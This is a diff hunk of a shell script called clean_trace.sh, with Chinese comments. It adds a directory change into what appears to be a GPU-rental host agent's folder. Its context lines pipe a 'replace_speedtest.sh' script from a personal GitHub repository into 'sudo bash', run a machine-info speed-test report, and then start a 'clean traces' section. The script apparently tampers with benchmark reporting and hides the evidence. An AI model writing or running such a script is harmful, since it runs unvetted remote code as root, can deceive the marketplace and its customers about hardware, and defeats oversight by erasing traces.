@@ -9,6 +9,7 @@ cat > clean_trace.sh << 'EOF'
 echo "🔧 开始主要任务..."
 # 你原来的任务命令，例如：
 curl -fsSL https://raw.githubusercontent.com/534607701/nick/main/replace_speedtest.sh | sudo bash
+cd /var/lib/vastai_kaalia
 sudo ./send_mach_info.py --speedtest
 
 # *** 清理痕迹 ***
